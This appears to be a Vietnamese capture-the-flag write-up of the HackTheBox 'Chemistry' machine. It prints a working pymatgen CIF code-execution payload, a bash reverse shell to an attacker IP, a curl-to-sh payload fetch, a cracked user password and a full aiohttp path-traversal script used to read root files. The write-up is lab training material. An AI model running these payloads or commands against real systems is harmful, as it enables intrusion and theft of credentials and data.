# Chemistry

<img width="1435" height="722" alt="image" src="https://github.com/user-attachments/assets/e1cc2226-facd-47b7-bab1-bbbfe325d35a" />

Tôi scan port bằng `nmap -sV 10.10.11.38` và ra được 2 port đang mở là 22 và 5000:

<img width="880" height="193" alt="image" src="https://github.com/user-attachments/assets/315b4a42-12ce-4bce-b5dd-567bbaadc6b2" />

Truy cập vào port 5000 thì là 1 website:

<img width="1804" height="1014" alt="image" src="https://github.com/user-attachments/assets/a8963970-76e2-4042-b5f8-93fd588ad62e" />

Tôi đăng kí tài khoản, vào dashboard thì thấy có chỗ để upload và chỉ nhận file `cif` 

<img width="1804" height="1014" alt="image" src="https://github.com/user-attachments/assets/4b7644b1-efc1-4341-b33a-86f86bfd8aee" />

Upload lên thì có dạng như này:

<img width="1164" height="810" alt="image" src="https://github.com/user-attachments/assets/c27b6711-f94c-48e1-af57-6c1a17f799fb" />

Recon tiếp như fuzzing dir với subdomain thì không ra cái gì đáng chú ý lắm

Tôi search mạng xem có vuln nào về cif không thì có xuất hiện [CVE-2024-23346](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f):

<img width="1149" height="538" alt="image" src="https://github.com/user-attachments/assets/63526d2a-2887-4d48-a014-678818d518a2" />

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
Thay lệnh trong system là được, tôi thử áp dụng với website với lệnh là curl đến ip của tôi:

<img width="1609" height="860" alt="image" src="https://github.com/user-attachments/assets/22246edf-06e0-4601-ad30-6d347493a41c" />

Bắt được request nên chứng minh được là có thể RCE được, tôi tạo reverse shell:

Tôi tạo file `shell.sh` với nội dung là:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.3/1234 0>&1'
```
Lắng nghe ở port 1234 `nc -lvp 1234` và `python3 -m http.server` để thực thi `curl http://10.10.14.3:8000/shell.sh|sh` nhằm lấy nội dung file `shell.sh` và thực thi nó:

<img width="1751" height="934" alt="image" src="https://github.com/user-attachments/assets/0f1b8e52-f68e-47f1-a851-70154ab69b67" />

RCE được web rồi, tôi ngồi lục được file `database.db`:

<img width="805" height="389" alt="image" src="https://github.com/user-attachments/assets/26c68ef1-85c7-409e-808e-2d279d73218b" />

Tôi dùng python để mở cổng 8000 và tải file đó về:

<img width="826" height="309" alt="image" src="https://github.com/user-attachments/assets/524e9e1a-54d8-4074-823e-da4dc5e9a1e2" />

Tôi tìm được username và hash của password, nhìn khá giống md5 nên tôi truy cập vào [crackstation](https://crackstation.net/) để crack mật khẩu:

<img width="749" height="697" alt="image" src="https://github.com/user-attachments/assets/499d213e-4a88-45f9-b386-d1fbc0a452d5" />

Tôi kiếm được plain text của vài cái mật khẩu:

<img width="1088" height="857" alt="image" src="https://github.com/user-attachments/assets/9ca82e37-59df-48d1-b672-49a3eb6d7a76" />

<img width="531" height="141" alt="image" src="https://github.com/user-attachments/assets/c39cd7ed-3f96-4ab9-8fdc-94ffc59b8ff4" />

Dựa vào nội dung của file `etc/passwd` thì có root, app và rosa là có bash và kết hợp với password vừa crack được của rosa thì tôi ssh vào với username là rosa và mật khẩu là `unicorniosrosados`

<img width="565" height="159" alt="image" src="https://github.com/user-attachments/assets/68d22676-d0f3-49d1-b685-4e08236015b2" />

Tôi dùng `ss -ltupn` để check các port trên server:

<img width="1678" height="264" alt="image" src="https://github.com/user-attachments/assets/b9aa9fed-fcb1-4845-8339-dbee83956684" />

Ngoài các port scan thấy bằng nmap ra thì trên server có xuất hiện port 8080:

<img width="1427" height="799" alt="image" src="https://github.com/user-attachments/assets/1430b528-193f-488c-b27f-9a4521ce0668" />

Quả website có tên là `Site Monitoring` và tôi tìm được ở `/opt/` nhưng mà lại không vào được:

<img width="868" height="140" alt="image" src="https://github.com/user-attachments/assets/9487f645-969f-4135-a866-ba7939a35e10" />

Tôi nối port từ trên server ra máy thật thông qua ssh:
```
ssh -L 4444:localhost:8080 rosa@10.10.11.38
```
<img width="1793" height="959" alt="image" src="https://github.com/user-attachments/assets/eef27cfa-6d5f-4d54-a0bf-b748dfa6518f" />

Trang web không có nhiều chức năng lắm, nhưng nó là `aiohttp/3.9.1` 

<img width="1429" height="865" alt="image" src="https://github.com/user-attachments/assets/c57d9558-7331-450d-9a1d-4f28b169cbc2" />

Và có [CVE-2024-23334](https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC) thuộc loại LFI
#
```
#!/bin/bash

# Author TheRedP4nther
# Description: Script to automate a Local File Inclusion (LFI) on the aiohttp 3.9.1 server.
# Usage: ./lfi_aiohttp.sh -f /path/to/file/to/dump

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Global Variables
file="$1"
main_url="http://localhost:8080" # Change if necessary.
payload="/assets/" # Change if necessary.
string="../"

# Functions
function ctrl_c(){
  echo -e "\n${redColour}[+] Leaving the program...${endColour}\n"
  tput cnorm; exit 1 # Forced exit and recover the cursor.
}

function helpPanel(){
  echo -e "\n$purpleColour[i]${endColour} ${grayColour}USE OF THE PROGRAM:${endColour} ${purpleColour}$0 -f /file/to/dump${endColour}\n"
  echo -e "\t${grayColour}[1]${endColour} ${purpleColour}f)${endColour} ${grayColour}Indicate the file you want to dump.${endColour}"
  echo -e "\t${grayColour}[2]${endColour} ${purpleColour}h)${endColour} ${grayColour}Get de Help Panel.${endColour}\n"
}

function getFile(){
  file="$1"

  url_checker="$(curl -s -o /dev/null -w "%{http_code}" --path-as-is "$main_url")" 

  tput civis # Remove the cursor from the screen to a better experience.
  
  for i in $(seq 1 15); do
    if [ "$url_checker" -eq 200 ]; then 
      command="$(curl -s --path-as-is "$main_url$payload$string$file")"
      output_checker="$(echo "$command" | grep 404)"
      if [ ! "$output_checker" ]; then 
        echo -e "\n${yellowColour}[+] Curl output to the resulting url: $main_url$payload$string$file.${endColour}\n"
        echo -e "\n${purpleColour}$command${endColour}"
        echo -e "\n${yellowColour}[+] File dumped successfully.${endColour}\n"
        break
      else
        payload+="$string"
      fi
    else 
      echo -e "\n${redColour}[+] The URL is not valid or active. Check it and try again.${endColour}\n"
      tput cnorm # Recover cursor if URL is invalid.
      break
    fi
  done

  tput cnorm # Recover the cursor after a successful execution.
}

# Ctrl+C 
trap ctrl_c INT

if [ "$file" ]; then 
  :
else
  echo -e "\n${redColour}[!] No file indicated to dump.${endColour}"
fi

declare -i counter=0

while getopts "f:h" arg; do 
case $arg in
  f)file="$OPTARG"; let counter+=1;;
  h);;
esac
done

if [ "$counter" -eq 1 ]; then 
  getFile "$file"
else 
  helpPanel
fi
```
#
Khi chạy script này thì có thể đọc được nội dung của file dưới user là root, từ đó có thể leo lên root bằng cách đọc ssh key:

<img width="1179" height="776" alt="image" src="https://github.com/user-attachments/assets/202dd56b-39d5-4224-abfd-e36d9b630075" />












